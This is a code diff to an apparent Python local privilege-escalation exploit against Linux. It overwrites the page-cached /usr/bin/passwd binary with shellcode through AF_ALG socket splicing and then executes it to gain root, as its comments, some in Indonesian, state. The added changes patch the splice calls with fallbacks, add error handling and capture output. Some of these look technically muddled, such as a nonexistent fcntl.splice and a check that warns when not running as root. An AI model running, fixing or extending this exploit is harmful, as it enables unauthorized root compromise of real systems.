@@ -25,6 +25,7 @@ Technical Details:
 import os
 import zlib
 import socket
+import fcntl
 
 # --- [A] Target File: /usr/bin/passwd ---
 TARGET = "/usr/bin/passwd"
@@ -112,10 +113,21 @@ def copyfail_write(filedes: int, offset: int, chunk: bytes) -> None:
     pipe_rd, pipe_wr = os.pipe()
 
     # splice from target file (page cache) -> pipe
-    os.splice(filedes, pipe_wr, splice_len, offset_src=0)
+    # Menggunakan fcntl.splice() karena os.splice() tidak tersedia
+    try:
+        # Kirim data dari file ke pipe
+        fcntl.splice(filedes, None, pipe_wr, None, splice_len, 0)
+    except AttributeError:
+        # Fallback: gunakan os.sendfile() jika fcntl.splice() tidak tersedia
+        os.sendfile(pipe_wr, filedes, 0, splice_len)
 
     # splice from pipe -> AF_ALG socket (chains page-cache pages into dst scatterlist)
-    os.splice(pipe_rd, req_sock.fileno(), splice_len)
+    try:
+        fcntl.splice(pipe_rd, None, req_sock.fileno(), None, splice_len, 0)
+    except AttributeError:
+        # Fallback: baca dari pipe dan tulis ke socket
+        data = os.read(pipe_rd, splice_len)
+        req_sock.send(data)
 
     # --- [D] Trigger decrypt -> scratch write into page cache ---
     try:
@@ -137,6 +149,11 @@ def main() -> None:
     print(f"[*] Target: {TARGET}")
     print(f"[*] Shellcode length: {len(SHELLCODE)} bytes ({len(SHELLCODE)//4} x 4-byte writes)")
 
+    # Check if running as root (required for this exploit)
+    if os.geteuid() != 0:
+        print("[!] Warning: This exploit requires root privileges to access AF_ALG socket")
+        print("[!] Please run with sudo")
+
     # --- [A] Buka file target (/usr/bin/passwd) ---
     fd = os.open(TARGET, os.O_RDONLY)
     print(f"[*] Opened {TARGET} (fd={fd})")
@@ -152,7 +169,11 @@ def main() -> None:
             f"    [+] Writing chunk at offset {offset:3d}: 0x{hexdump_bytes(chunk)} "
             f"({chunk!r})"
         )
-        copyfail_write(fd, offset, chunk)
+        try:
+            copyfail_write(fd, offset, chunk)
+        except Exception as e:
+            print(f"    [!] Error at offset {offset}: {e}")
+            break
         offset += 4
 
     os.close(fd)
@@ -162,7 +183,15 @@ def main() -> None:
     print(f"[*] Executing {TARGET} ...")
     print(f"[*] --- [G] Karena page cache sudah diubah, passwd menjalankan shellcode ---")
     print(f"[*] --- [H] Shellcode memberikan akses root ---")
-    os.system(TARGET)
+    
+    # Gunakan subprocess untuk menangkap output
+    import subprocess
+    result = subprocess.run([TARGET], capture_output=True, text=True)
+    print(f"[*] Exit code: {result.returncode}")
+    if result.stdout:
+        print(f"[*] stdout: {result.stdout}")
+    if result.stderr:
+        print(f"[*] stderr: {result.stderr}")
 
 
 if __name__ == "__main__":
